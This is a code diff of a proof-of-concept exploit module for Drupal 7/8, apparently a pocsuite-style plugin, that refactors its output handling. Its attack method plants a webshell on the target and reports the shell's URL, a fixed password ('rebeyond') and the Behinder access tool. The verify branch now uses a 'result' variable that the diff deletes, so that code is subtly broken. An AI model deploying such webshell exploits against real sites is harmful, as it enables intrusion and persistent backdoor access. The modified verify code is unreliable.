@@ -43,13 +43,10 @@ class DemoPOC(POCBase):
             self.url = self.url[:-1]
         vulkey = self.detect_drupal_8(self.url)
         if vulkey:
-            result = {
-                'Result': {
-                    'target': '{0} has vulnerability'.format(self.url),
-                    'vulkey': vulkey,
-                }
-            }
-            return self.parse_output(output, result)
+            output.success(result)
+        else:
+            output.fail()
+        return output
 
     def _attack(self):
         output = Output(self)
@@ -59,23 +56,17 @@ class DemoPOC(POCBase):
         shell_name = self.pwn_drupal_8(self.url)
         if shell_name:
             result = {
-                'Result': {
-                    'target': self.url,
-                    'webshell': self.url + '/' + shell_name,
-                    'pass': 'rebeyond'
-                }
+                'webshell_url': self.url + '/' + shell_name,
+                'webshell_pass': 'rebeyond',
+                "webshell_access_tool": "behinder"
             }
-            return self.parse_output(output, result)
+            output.success(result)
+        else:
+            output.fail("attack fail")
+        return output
 
     def _shell(self):
         pass
-
-    def parse_output(self, output, result):
-        if result:
-            output.success(result)
-        else:
-            output.fail()
-        return output
 
     def detect_drupal_7(self, target):
         vulkey = random_str()
